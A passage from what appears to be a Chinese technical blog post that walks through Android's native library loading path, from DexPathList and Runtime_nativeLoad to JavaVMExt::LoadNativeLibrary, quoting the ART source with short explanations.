/libcore/dalvik/src/main/java/dalvik/system/BaseDexClassLoader.java</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getLdLibraryPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="keyword">for</span> (File directory : pathList.getNativeLibraryDirectories()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (result.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result.append(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        result.append(directory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /libcore/dalvik/src/main/java/dalvik/system/DexPathList.java</span></span><br><span class="line"><span class="keyword">public</span> List&lt;File&gt; <span class="title function_">getNativeLibraryDirectories</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> nativeLibraryDirectories;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /libcore/dalvik/src/main/java/dalvik/system/DexPathList.java</span></span><br><span class="line"><span class="number">160</span>        <span class="comment">// Native libraries may exist in both the system and</span></span><br><span class="line"><span class="number">161</span>        <span class="comment">// application library paths, and we use this search order:</span></span><br><span class="line"><span class="number">162</span>        <span class="comment">//</span></span><br><span class="line"><span class="number">163</span>        <span class="comment">//   1. This class loader&#x27;s library path for application libraries (librarySearchPath):</span></span><br><span class="line"><span class="number">164</span>        <span class="comment">//   1.1. Native library directories</span></span><br><span class="line"><span class="number">165</span>        <span class="comment">//   1.2. Path to libraries in apk-files</span></span><br><span class="line"><span class="number">166</span>        <span class="comment">//   2. The VM&#x27;s library path from the system property for system libraries</span></span><br><span class="line"><span class="number">167</span>        <span class="comment">//      also known as java.library.path</span></span><br><span class="line"><span class="number">168</span>        <span class="comment">//</span></span><br><span class="line"><span class="number">169</span>        <span class="comment">// This order was reversed prior to Gingerbread; see http://b/2933456.</span></span><br><span class="line"><span class="number">170</span>        <span class="built_in">this</span>.nativeLibraryDirectories = splitPaths(librarySearchPath, <span class="literal">false</span>);</span><br><span class="line"><span class="number">171</span>        <span class="built_in">this</span>.systemNativeLibraryDirectories =</span><br><span class="line"><span class="number">172</span>                splitPaths(System.getProperty(<span class="string">&quot;java.library.path&quot;</span>), <span class="literal">true</span>);</span><br><span class="line"><span class="number">173</span>        List&lt;File&gt; allNativeLibraryDirectories = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(nativeLibraryDirectories);</span><br><span class="line"><span class="number">174</span>        allNativeLibraryDirectories.addAll(systemNativeLibraryDirectories);</span><br><span class="line"><span class="number">175</span></span><br><span class="line"><span class="number">176</span>        <span class="built_in">this</span>.nativeLibraryPathElements = makePathElements(allNativeLibraryDirectories);</span><br></pre></td></tr></table></figure><p>从注释中可以知道nativeLibraryDirectories会按照以上顺序取得。</p><ul><li>否则直接进入<code>nativeLoad()</code>方法。</li></ul><h1 id="2-JNI层"><a href="#2-JNI层" class="headerlink" title="2. JNI层"></a>2. JNI层</h1><p>继续进入JNI层分析<code>nativeLoad()</code>，命名规则为“类名_方法名”。</p><h2 id="2-1-Runtime-nativeLoad"><a href="#2-1-Runtime-nativeLoad" class="headerlink" title="2.1 Runtime_nativeLoad()"></a>2.1 Runtime_nativeLoad()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /libcore/ojluni/src/main/native/Runtime.c</span></span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="title function_">Runtime_nativeLoad</span><span class="params">(JNIEnv* env, jclass ignored, jstring javaFilename,</span></span><br><span class="line"><span class="params">                   jobject javaLoader, jstring javaLibrarySearchPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> JVM_NativeLoad(env, javaFilename, javaLoader, javaLibrarySearchPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-2-JVM-NativeLoad"><a href="#2-2-JVM-NativeLoad" class="headerlink" title="2.2 JVM_NativeLoad()"></a>2.2 JVM_NativeLoad()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /art/runtime/openjdkjvm/OpenjdkJvm.cc</span></span><br><span class="line"><span class="number">322</span>JNIEXPORT jstring <span class="title function_">JVM_NativeLoad</span><span class="params">(JNIEnv* env,</span></span><br><span class="line"><span class="params"><span class="number">323</span>                                 jstring javaFilename,</span></span><br><span class="line"><span class="params"><span class="number">324</span>                                 jobject javaLoader,</span></span><br><span class="line"><span class="params"><span class="number">325</span>                                 jstring javaLibrarySearchPath)</span> &#123;</span><br><span class="line"><span class="number">326</span>  ScopedUtfChars <span class="title function_">filename</span><span class="params">(env, javaFilename)</span>;</span><br><span class="line"><span class="number">327</span>  <span class="keyword">if</span> (filename.c_str() == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">328</span>    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">329</span>  &#125;</span><br><span class="line"><span class="number">330</span></span><br><span class="line"><span class="number">331</span>  <span class="built_in">std</span>::<span class="built_in">string</span> error_msg;</span><br><span class="line"><span class="number">332</span>  &#123;</span><br><span class="line"><span class="number">333</span>    art::JavaVMExt* vm = art::Runtime::Current()-&gt;GetJavaVM();</span><br><span class="line"><span class="number">334</span>    <span class="type">bool</span> success = vm-&gt;LoadNativeLibrary(env,</span><br><span class="line"><span class="number">335</span>                                         filename.c_str(),</span><br><span class="line"><span class="number">336</span>                                         javaLoader,</span><br><span class="line"><span class="number">337</span>                                         javaLibrarySearchPath,</span><br><span class="line"><span class="number">338</span>                                         &amp;error_msg);</span><br><span class="line"><span class="number">339</span>    <span class="keyword">if</span> (success) &#123;</span><br><span class="line"><span class="number">340</span>      <span class="keyword">return</span> nullptr;</span><br><span class="line"><span class="number">341</span>    &#125;</span><br><span class="line"><span class="number">342</span>  &#125;</span><br><span class="line"><span class="number">343</span></span><br><span class="line"><span class="number">344</span>  <span class="comment">// Don&#x27;t let a pending exception from JNI_OnLoad cause a CheckJNI issue with NewStringUTF.</span></span><br><span class="line"><span class="number">345</span>  env-&gt;ExceptionClear();</span><br><span class="line"><span class="number">346</span>  <span class="keyword">return</span> env-&gt;NewStringUTF(error_msg.c_str());</span><br><span class="line"><span class="number">347</span>&#125;</span><br></pre></td></tr></table></figure><p>如果filename(在<code>loadLibrary0()</code>中构造的路径)非空，则进入javaVM加载；否则打印异常。</p><h2 id="2-3-LoadNativeLibrary"><a href="#2-3-LoadNativeLibrary" class="headerlink" title="2.3 LoadNativeLibrary()"></a>2.3 LoadNativeLibrary()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /art/runtime/java_vm_ext.cc</span></span><br><span class="line"><span class="number">796b</span>ool <span class="title function_">JavaVMExt::LoadNativeLibrary</span><span class="params">(JNIEnv* env,</span></span><br><span class="line"><span class="params"><span class="number">797</span>                                  <span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; path,</span></span><br><span class="line"><span class="params"><span class="number">798</span>                                  jobject class_loader,</span></span><br><span class="line"><span class="params"><span class="number">799</span>                                  jstring library_path,</span></span><br><span class="line"><span class="params"><span class="number">800</span>                                  <span class="built_in">std</span>::<span class="built_in">string</span>* error_msg)</span> &#123;</span><br><span class="line"><span class="number">801</span>  error_msg-&gt;clear();</span><br><span class="line"><span class="number">802</span></span><br><span class="line"><span class="number">803</span>  <span class="comment">// See if we&#x27;ve already loaded this library.  If we have, and the class loader</span></span><br><span class="line"><span class="number">804</span>  <span class="comment">// matches, return successfully without doing anything.</span></span><br><span class="line"><span class="number">805</span>  <span class="comment">// <span class="doctag">TODO:</span> for better results we should canonicalize the pathname (or even compare</span></span><br><span class="line"><span class="number">806</span>  <span class="comment">// inodes). This implementation is fine if everybody is using System.loadLibrary.</span></span><br><span class="line"><span class="number">807</span>  SharedLibrary* library;</span><br><span class="line"><span class="number">808</span>  Thread* self = Thread::Current();</span><br><span class="line"><span class="number">809</span>  &#123;</span><br><span class="line"><span class="number">810</span>    <span class="comment">// <span class="doctag">TODO:</span> move the locking (and more of this logic) into Libraries.</span></span><br><span class="line"><span class="number">811</span>    MutexLock <span class="title function_">mu</span><span class="params">(self, *Locks::jni_libraries_lock_)</span>;</span><br><span class="line"><span class="number">812</span>    library = libraries_-&gt;Get(path);</span><br><span class="line"><span class="number">813</span>  &#125;</span><br><span class="line"><span class="number">814</span>  <span class="type">void</span>* class_loader_allocator = nullptr;</span><br><span class="line"><span class="number">815</span>  &#123;</span><br><span class="line"><span class="number">816</span>    ScopedObjectAccess <span class="title function_">soa</span><span class="params">(env)</span>;</span><br><span class="line"><span class="number">817</span>    <span class="comment">// As the incoming class loader is reachable/alive during the call of this function,</span></span><br><span class="line"><span class="number">818</span>    <span class="comment">// it&#x27;s okay to decode it without worrying about unexpectedly marking it alive.</span></span><br><span class="line"><span class="number">819</span>    ObjPtr&lt;mirror::ClassLoader&gt; loader = soa.Decode&lt;mirror::ClassLoader&gt;(class_loader);</span><br><span class="line"><span class="number">820</span></span><br><span class="line"><span class="number">821</span>    ClassLinker* class_linker = Runtime::Current()-&gt;GetClassLinker();</span><br><span class="line"><span class="number">822</span>    <span class="keyword">if</span> (class_linker-&gt;IsBootClassLoader(soa, loader.Ptr())) &#123;</span><br><span class="line"><span class="number">823</span>      loader = nullptr;</span><br><span class="line"><span class="number">824</span>      class_loader = nullptr;</span><br><span class="line"><span class="number">825</span>    &#125;</span><br><span class="line"><span class="number">826</span></span><br><span class="line"><span class="number">827</span>    class_loader_allocator = class_linker-&gt;GetAllocatorForClassLoader(loader.Ptr());</span><br><span class="line"><span class="number">828</span>    CHECK(class_loader_allocator != nullptr);</span><br><span class="line"><span class="number">829</span>  &#125;</span><br><span class="line"><span class="number">830</span>  <span class="keyword">if</span> (library != nullptr) &#123;</span><br><span class="line"><span class="number">831</span>    <span class="comment">// Use the allocator pointers for class loader equality to avoid unnecessary weak root decode.</span></span><br><span class="line"><span class="number">832</span>    <span class="keyword">if</span> (library-&gt;GetClassLoaderAllocator() != class_loader_allocator) &#123;</span><br><span class="line"><span class="number">833</span>      <span class="comment">// The library will be associated with class_loader. The JNI</span></span><br><span class="line"><span class="number">834</span>      <span class="comment">// spec says we can&#x27;t load the same library into more than one</span></span><br><span class="line"><span class="number">835</span>      <span class="comment">// class loader.</span></span><br><span class="line"><span class="number">836</span>      StringAppendF(error_msg, <span class="string">&quot;Shared library \&quot;%s\&quot; already opened by &quot;</span></span><br><span class="line"><span class="number">837</span>          <span class="string">&quot;ClassLoader %p; can&#x27;t open in ClassLoader %p&quot;</span>,</span><br><span class="line"><span class="number">838</span>          path.c_str(), library-&gt;GetClassLoader(), class_loader);</span><br><span class="line"><span class="number">839</span>      LOG(WARNING) &lt;&lt; error_msg;</span><br><span class="line"><span class="number">840</span>      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">841</span>    &#125;</span><br><span class="line"><span class="number">842</span>    VLOG(jni) &lt;&lt; <span class="string">&quot;[Shared library \&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class="string">&quot;\&quot; already loaded in &quot;</span></span><br><span class="line"><span class="number">843</span>              &lt;&lt; <span class="string">&quot; ClassLoader &quot;</span> &lt;&lt; class_loader &lt;&lt; <span class="string">&quot;]&quot;</span>;</span><br><span class="line"><span class="number">844</span>    <span class="keyword">if</span> (!library-&gt;CheckOnLoadResult()) &#123;</span><br><span class="line"><span class="number">845</span>      StringAppendF(error_msg, <span class="string">&quot;JNI_OnLoad failed on a previous attempt &quot;</span></span><br><span class="line"><span class="number">846</span>          <span class="string">&quot;to load \&quot;%s\&quot;&quot;</span>, path.c_str());</span><br><span class="line"><span class="number">847</span>      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">848</span>    &#125;</span><br><span class="line"><span class="number">849</span>    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="number">850</span>  &#125;</span><br><span class="line"><span class="number">851</span></span><br><span class="line"><span class="number">852</span>  <span class="comment">// Open the shared library.  Because we&#x27;re using a full path, the system</span></span><br><span class="line"><span class="number">853</span>  <span class="comment">// doesn&#x27;t have to search through LD_LIBRARY_PATH.  (It may do so to</span></span><br><span class="line"><span class="number">854</span>  <span class="comment">// resolve this library&#x27;s dependencies though.)</span></span><br><span class="line"><span class="number">855</span></span><br><span class="line"><span class="number">856</span>  <span class="comment">// Failures here are expected when java.library.path has several entries</span></span><br><span class="line"><span class="number">857</span>  <span class="comment">// and we have to hunt for the lib.</span></span><br><span class="line"><span class="number">858</span></span><br><span class="line"><span class="number">859</span>  <span class="comment">// Below we dlopen but there is no paired dlclose, this would be necessary if we supported</span></span><br><span class="line"><span class="number">860</span>  <span class="comment">// class unloading. Libraries will only be unloaded when the reference count (incremented by</span></span><br><span class="line"><span class="number">861</span>  <span class="comment">// dlopen) becomes zero from dlclose.</span></span><br><span class="line"><span class="number">862</span></span><br><span class="line"><span class="number">863</span>  Locks::mutator_lock_-&gt;AssertNotHeld(self);</span><br><span class="line"><span class="number">864</span>  <span class="type">const</span> <span class="type">char</span>* path_str = path.empty() ? nullptr : path.c_str();</span><br><span class="line"><span class="number">865</span>  <span class="type">bool</span> needs_native_bridge = <span class="literal">false</span>;</span><br><span class="line"><span class="number">866</span>  <span class="type">void</span>* handle = android::OpenNativeLibrary(env,</span><br><span class="line"><span class="number">867</span>                                            runtime_-&gt;GetTargetSdkVersion(),</span><br><span class="line"><span class="number">868</span>                                            path_str,</span><br><span class="line"><span class="number">869</span>                                            class_loader,</span><br><span class="line"><span class="number">870</span>                                            library_path,</span><br><span class="line"><span class="number">871</span>                                            &amp;needs_native_bridge,</span><br><span class="line"><span class="number">872</span>                                            error_msg);</span><br><span class="line"><span class="number">873</span></span><br><span class="line"><span class="number">874</span>  VLOG(jni) &lt;&lt; <span class="string">&quot;[Call to dlopen(\&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class="string">&quot;\&quot;, RTLD_NOW) returned &quot;</span> &lt;&lt; handle &lt;&lt; <span class="string">&quot;]&quot;</span>;</span><br><span class="line"><span class="number">875</span></span><br><span class="line"><span class="number">876</span>  <span class="keyword">if</span> (handle == nullptr) &#123;</span><br><span class="line"><span class="number">877</span>    VLOG(jni) &lt;&lt; <span class="string">&quot;dlopen(\&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class="string">&quot;\&quot;, RTLD_NOW) failed: &quot;</span> &lt;&lt; *error_msg;</span><br><span class="line"><span class="number">878</span>    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">879</span>  &#125;</span><br><span class="line"><span class="number">880</span></span><br><span class="line"><span class="number">881</span>  <span class="keyword">if</span> (env-&gt;ExceptionCheck() == JNI_TRUE) &#123;</span><br><span class="line"><span class="number">882</span>    LOG(ERROR) &lt;&lt; <span class="string">&quot;Unexpected exception:&quot;</span>;</span><br><span class="line"><span class="number">883</span>    env-&gt;ExceptionDescribe();</span><br><span class="line"><span class="number">884</span>    env-&gt;ExceptionClear();</span><br><span class="line"><span class="number">885</span>  &#125;</span><br><span class="line"><span class="number">886</span>  <span class="comment">// Create a new entry.</span></span><br><span class="line"><span class="number">887</span>  <span class="comment">// <span class="doctag">TODO:</span> move the locking (and more of this logic) into Libraries.</span></span><br><span class="line"><span class="number">888</span>  <span class="type">bool</span> created_library = <span class="literal">false</span>;</span><br><span class="line"><span class="number">889</span>  &#123;</span><br><span class="line"><span class="number">890</span>    <span class="comment">// Create SharedLibrary ahead of taking the libraries lock to maintain lock ordering.</span></span><br><span class="line"><span class="number">891</span>    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;SharedLibrary&gt; <span class="title function_">new_library</span><span class="params">(</span></span><br><span class="line"><span class="params"><span class="number">892</span>        new SharedLibrary(env,</span></span><br><span class="line"><span class="params"><span class="number">893</span>                          self,</span></span><br><span class="line"><span class="params"><span class="number">894</span>                          path,</span></span><br><span class="line"><span class="params"><span class="number">895</span>                          handle,</span></span><br><span class="line"><span class="params"><span class="number">896</span>                          needs_native_bridge,</span></span><br><span class="line"><span class="params"><span class="number">897</span>                          class_loader,</span></span><br><span class="line"><span class="params"><span class="number">898</span>                          class_loader_allocator))</span>;</span><br><span class="line"><span class="number">899</span></span><br><span class="line"><span class="number">900</span>    MutexLock <span class="title function_">mu</span><span class="params">(self, *Locks::jni_libraries_lock_)</span>;</span><br><span class="line"><span class="number">901</span>    library = libraries_-&gt;Get(path);</span><br><span class="line"><span class="number">902</span>    <span class="keyword">if</span> (library == nullptr) &#123;  <span class="comment">// We won race to get libraries_lock.</span></span><br><span class="line"><span class="number">903</span>      library = new_library.release();</span><br><span class="line"><span class="number">904</span>      libraries_-&gt;Put(path, library);</span><br><span class="line"><span class="number">905</span>      created_library = <span class="literal">true</span>;</span><br><span class="line"><span class="number">906</span>    &#125;</span><br><span class="line"><span class="number">907</span>  &#125;</span><br><span class="line"><span class="number">908</span>  <span class="keyword">if</span> (!created_library) &#123;</span><br><span class="line"><span class="number">909</span>    LOG(INFO) &lt;&lt; <span class="string">&quot;WOW: we lost a race to add shared library: &quot;</span></span><br><span class="line"><span class="number">910</span>        &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class="string">&quot;\&quot; ClassLoader=&quot;</span> &lt;&lt; class_loader;</span><br><span class="line"><span class="number">911</span>    <span class="keyword">return</span> library-&gt;CheckOnLoadResult();</span><br><span class="line"><span class="number">912</span>  &#125;</span><br><span class="line"><span class="number">913</span>  VLOG(jni) &lt;&lt; <span class="string">&quot;[Added shared library \&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class="string">&quot;\&quot; for ClassLoader &quot;</span> &lt;&lt; class_loader &lt;&lt; <span class="string">&quot;]&quot;</span>;</span><br><span class="line"><span class="number">914</span></span><br><span class="line"><span class="number">915</span>  <span class="type">bool</span> was_successful = <span class="literal">false</span>;</span><br><span class="line"><span class="number">916</span>  <span class="type">void</span>* sym = library-&gt;FindSymbol(<span class="string">&quot;JNI_OnLoad&quot;</span>, nullptr);</span><br><span class="line"><span class="number">917</span>  <span class="keyword">if</span> (sym == nullptr) &#123;</span><br><span class="line"><span class="number">918</span>    VLOG(jni) &lt;&lt; <span class="string">&quot;[No JNI_OnLoad found in \&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class="string">&quot;\&quot;]&quot;</span>;</span><br><span class="line"><span class="number">919</span>    was_successful = <span class="literal">true</span>;</span><br><span class="line"><span class="number">920</span>  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">921</span>    <span class="comment">// Call JNI_OnLoad.  We have to override the current class</span></span><br><span class="line"><span class="number">922</span>    <span class="comment">// loader, which will always be &quot;null&quot; since the stuff at the</span></span><br><span class="line"><span class="number">923</span>    <span class="comment">// top of the stack is around Runtime.loadLibrary().  (See</span></span><br><span class="line"><span class="number">924</span>    <span class="comment">// the comments in the JNI FindClass function.)</span></span><br><span class="line"><span class="number">925</span>    ScopedLocalRef&lt;jobject&gt; old_class_loader(env, env-&gt;NewLocalRef(self-&gt;GetClassLoaderOverride()));</span><br><span class="line"><span class="number">926</span>    self-&gt;SetClassLoaderOverride(class_loader);</span><br><span class="line"><span class="number">927</span></span><br><span class="line"><span class="number">928</span>    VLOG(jni) &lt;&lt; <span class="string">&quot;[Calling JNI_OnLoad in \&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class="string">&quot;\&quot;]&quot;</span>;</span><br><span class="line"><span class="number">929</span>    <span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*JNI_OnLoadFn)</span><span class="params">(JavaVM*, <span class="type">void</span>*)</span>;</span><br><span class="line"><span class="number">930</span>    JNI_OnLoadFn jni_on_load = reinterpret_cast&lt;JNI_OnLoadFn&gt;(sym);</span><br><span class="line"><span class="number">931</span>    <span class="type">int</span> version = (*jni_on_load)(this, nullptr);</span><br><span class="line"><span class="number">932</span></span><br><span class="line"><span class="number">933</span>    <span class="keyword">if</span> (runtime_-&gt;GetTargetSdkVersion() != <span class="number">0</span> &amp;&amp; runtime_-&gt;GetTargetSdkVersion() &lt;= <span class="number">21</span>) &#123;</span><br><span class="line"><span class="number">934</span>      <span class="comment">// Make sure that sigchain owns SIGSEGV.</span></span><br><span class="line"><span class="number">935</span>      EnsureFrontOfChain(SIGSEGV);</span><br><span class="line"><span class="number">936</span>    &#125;</span><br><span class="line"><span class="number">937</span></span><br><span class="line"><span class="number">938</span>    self-&gt;SetClassLoaderOverride(old_class_loader.get());</span><br><span class="line"><span class="number">939</span></span><br><span class="line"><span class="number">940</span>    <span class="keyword">if</span> (version == JNI_ERR) &#123;</span><br><span class="line"><span class="number">941</span>      StringAppendF(error_msg, <span class="string">&quot;JNI_ERR returned from JNI_OnLoad in \&quot;%s\&quot;&quot;</span>, path.c_str());</span><br><span class="line"><span class="number">942</span>    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (JavaVMExt::IsBadJniVersion(version)) &#123;</span><br><span class="line"><span class="number">943</span>      StringAppendF(error_msg, <span class="string">&quot;Bad JNI version returned from JNI_OnLoad in \&quot;%s\&quot;: %d&quot;</span>,</span><br><span class="line"><span class="number">944</span>                    path.c_str(), version);</span><br><span class="line"><span class="number">945</span>      <span class="comment">// It&#x27;s unwise to call dlclose() here, but we can mark it</span></span><br><span class="line"><span class="number">946</span>      <span class="comment">// as bad and ensure that future load attempts will fail.</span></span><br><span class="line"><span class="number">947</span>      <span class="comment">// We don&#x27;t know how far JNI_OnLoad got, so there could</span></span><br><span class="line"><span class="number">948</span>      <span class="comment">// be some partially-initialized stuff accessible through</span></span><br><span class="line"><span class="number">949</span>      <span class="comment">// newly-registered native method calls.  We could try to</span></span><br><span class="line"><span class="number">950</span>      <span class="comment">// unregister them, but that doesn&#x27;t seem worthwhile.</span></span><br><span class="line"><span class="number">951</span>    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">952</span>      was_successful = <span class="literal">true</span>;</span><br><span class="line"><span class="number">953</span>    &#125;</span><br><span class="line"><span class="number">954</span>    VLOG(jni) &lt;&lt; <span class="string">&quot;[Returned &quot;</span> &lt;&lt; (was_successful ? <span class="string">&quot;successfully&quot;</span> : <span class="string">&quot;failure&quot;</span>)</span><br><span class="line"><span class="number">955</span>              &lt;&lt; <span class="string">&quot; from JNI_OnLoad in \&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class="string">&quot;\&quot;]&quot;</span>;</span><br><span class="line"><span class="number">956</span>  &#125;</span><br><span class="line"><span class="number">957</span></span><br><span class="line"><span class="number">958</span>  library-&gt;SetResult(was_successful);</span><br><span class="line"><span class="number">959</span>  <span class="keyword">return</span> was_successful;</span><br><span class="line"><span class="number">960</span>&#125;</span><br></pre></td></tr></table></figure><p>当sym==nullptr 的时候它直接返回true，这里是因为首次加载的时候，JNI_OnLoad 函数是首次执行，所以它首次加载。如果加载过了，就要找到加载过它的ClassLoader，并且拿到相关信息验证，信息无误之后才返回true。</p><h2 id="2-4-OpenNativeLibrary"><a href="#2-4-OpenNativeLibrary" class="headerlink" title="2.4 OpenNativeLibrary()"></a>2.4 OpenNativeLibrary()</h2><p>根据参数溯源，来到<code>OpenNativeLibrary()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 